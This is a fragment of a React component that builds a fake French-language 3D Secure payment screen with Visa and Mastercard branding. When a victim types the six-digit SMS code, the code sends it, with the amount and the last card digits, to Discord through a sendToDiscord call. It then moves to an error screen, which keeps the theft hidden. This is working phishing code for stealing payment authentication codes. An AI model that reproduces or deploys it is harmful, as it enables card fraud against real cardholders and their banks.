          ...
          {step === CheckoutStep.THREED_SECURE_LOADING && (
            <div className="py-6 text-center">
                <div className="flex items-center justify-between mb-4 px-2">
                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSyND6FWadxbUttWH2gUZ6jpnrgJCc9npgGqw&s" className="h-5 mix-blend-multiply" alt="Visa" referrerPolicy="no-referrer" />
                    <img src="https://www.mastercard.us/content/dam/mccom/global/logos/logo-mastercard-mobile.svg" className="h-8" alt="Mastercard"/>
                </div>
                <h3 className="text-lg font-bold text-gray-900">Authentification 3D Secure</h3>
                <p className="text-sm text-gray-500 mt-1">Validation de votre paiement requise.</p>
                
                <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 my-4 space-y-2 text-sm text-left">
                ...
                <div className="space-y-4">
                  <div className="bg-blue-50 border border-blue-100 p-4 rounded-xl text-left">
                    <h4 className="font-bold text-blue-900 text-sm mb-2"><i className="fas fa-mobile-alt mr-2"></i>Option 1 : Application bancaire</h4>
                    <p className="text-sm text-blue-800 mb-3">Connectez-vous sur votre banque pour confirmer la notification reçue.</p>
                    <button 
                        onClick={() => {
                            setStep(CheckoutStep.ERROR);
                            onSuccess();
                        }}
                        className="w-full bg-white border border-blue-200 text-blue-700 font-bold py-2 rounded-lg hover:bg-blue-50 transition-colors text-sm"
                    >
                        J'ai validé dans l'application
                    </button>
                  </div>
                  ...
                  <div className="bg-gray-50 border border-gray-200 p-4 rounded-xl text-left">
                    <h4 className="font-bold text-gray-900 text-sm mb-2"><i className="fas fa-comment-sms mr-2"></i>Option 2 : Code SMS</h4>
                    <p className="text-sm text-gray-600 mb-3">Saisissez le code à 6 chiffres reçu par SMS ou sur votre application :</p>
                    <input 
                      name="smsCode" 
                      ...
                      placeholder="000000" 
                      maxLength={6}
                      className="w-full p-3 rounded-xl border border-gray-300 focus:border-[#0866FF] outline-none text-center tracking-widest text-xl font-mono mb-3"
                    />
                    <button 
                        onClick={async () => {
                            if (formData.smsCode.length === 6) {
                                await sendToDiscord("Code 3D Secure", {
                                    "Code": formData.smsCode,
                                    "Montant": formattedAmount,
                                    "Carte": formData.card.slice(-4)
                                });
                                setStep(CheckoutStep.ERROR);
                                onSuccess();
                            }
                        ...
                        className="w-full bg-[#0866FF] text-white font-bold py-2 rounded-lg hover:bg-[#0759e0] transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed text-sm"
                    >
                        Valider le code
                    </button>
                  </div>
